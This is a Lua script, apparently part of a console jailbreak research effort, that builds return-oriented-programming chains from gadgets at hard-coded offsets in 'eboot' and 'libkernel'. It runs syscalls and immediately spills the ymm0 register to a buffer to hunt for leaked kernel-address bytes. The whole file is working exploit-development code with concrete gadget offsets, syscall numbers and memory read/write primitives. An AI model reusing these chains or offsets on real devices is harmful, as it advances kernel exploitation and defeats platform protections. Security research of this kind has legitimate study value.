-- CRASH_CLASS: MODERATE  (ROP chain hands the CPU straight from 'syscall; ret' into the ymm0 store, no Lua between)
-- PROBE 1189a: the ymm0 question, asked correctly.
-- 1187a called the store gadget from Lua AFTER a syscall and got zeros; the memcpy control in 1188a proved the
-- fcall path works (buffer became "/libexec/ld-elf."), so the zeros were real - but a Lua call in between the
-- syscall and the store can zero ymm0 by itself. Here the two are adjacent instructions in ONE ropchain:
--    pop rsi ; ret          -> our buffer
--    pop rax ; ret          -> syscall number
--    libkernel+7            -> 'syscall ; ret'   (the wrapper the loader calls for every syscall)
--    eboot+0xF7CB7          -> 'vmovups [rsi], ymm0 ; ret'
-- so nothing of ours runs between the kernel returning and the spill.
print("=== PROBE 1189a: IN-CHAIN ymm0 SPILL ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function hexn(n) n=N(n) return string.format("0x%08X%08X", math.floor(n/4294967296), n % 4294967296) end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local be = N(eboot_base)
local SC = N(syscall.syscall_address)
local GAD = be + 0xF7CB7
print("[A] eboot=" .. hexn(be) .. " store_gadget=" .. hexn(GAD) .. " syscall_gadget=" .. hexn(SC))
local BUF = N(memory.alloc(0x100))
print("[A] spill buffer=" .. hexn(BUF))
local function fill(v) for i=0,0x3C,4 do pcall(function() memory.write_dword(BUF+i, v) end) end end
local function dump(tag)
  local o,buf = pcall(function() return memory.read_buffer(BUF, 32) end)
  if o and type(buf)=="string" and #buf==32 then
    local q = "" ; local kq = 0
    for i=0,3 do
      local lo = string.byte(buf,i*8+1)+string.byte(buf,i*8+2)*256+string.byte(buf,i*8+3)*65536+string.byte(buf,i*8+4)*16777216
      local hi = string.byte(buf,i*8+5)+string.byte(buf,i*8+6)*256+string.byte(buf,i*8+7)*65536+string.byte(buf,i*8+8)*16777216
      q = q .. string.format(" %08X%08X", hi, lo)
      if hi >= 0xFFFF8000 then kq = kq + 1 end
    end
    print(tag .. " " .. (string.gsub(buf, ".", function(c) return string.format("%02x", string.byte(c)) end)))
    print("   " .. q .. "  kernellike=" .. kq)
  else print(tag .. " READ-FAIL") end
end
-- build + run one chain; returns true on success
local function run(tag, build)
  fill(0xC7)
  local ok, err = pcall(function()
    local chain = ropchain()
    build(chain)
    local th = thread:new(chain)
    th:run(false)
  end)
  print(string.format("[%s] run ok=%s err=%s", tag, tostring(ok), tostring(err)))
  dump("[" .. tag .. "]")
end
-- [C] control: store only, no syscall - what a fresh thread's ymm0 looks like
run("C", function(chain)
  chain:push_set_rsi(BUF)
  chain:push(GAD)
end)
-- [P] getpid: syscall with no arguments, so rsi stays ours
run("P", function(chain)
  chain:push_set_rsi(BUF)
  chain:push_set_rax(20)
  chain:push(SC)
  chain:push(GAD)
end)
-- [G] getdirentries-sized read path: syscall 196 with a buffer arg
run("G", function(chain)
  chain:push_set_rsi(BUF)
  chain:push_set_rax(196)
  chain:push(SC)
  chain:push(GAD)
end)
-- [T] 638, the one syscall known to copy real kernel bytes into userland
local uap = N(memory.alloc(0x40))
local vo  = N(memory.alloc(0x20))
pcall(function()
  memory.write_qword(uap+0,  U(1000000000))
  memory.write_qword(uap+8,  U(vo))
  memory.write_qword(uap+16, U(0))
  memory.write_qword(uap+24, U(0))
end)
run("T", function(chain)
  chain:push_set_rdi(uap)
  chain:push_set_rsi(BUF)
  chain:push_set_rax(638)
  chain:push(SC)
  chain:push(GAD)
end)
print("[Z] alive")
print("=== DONE ===")
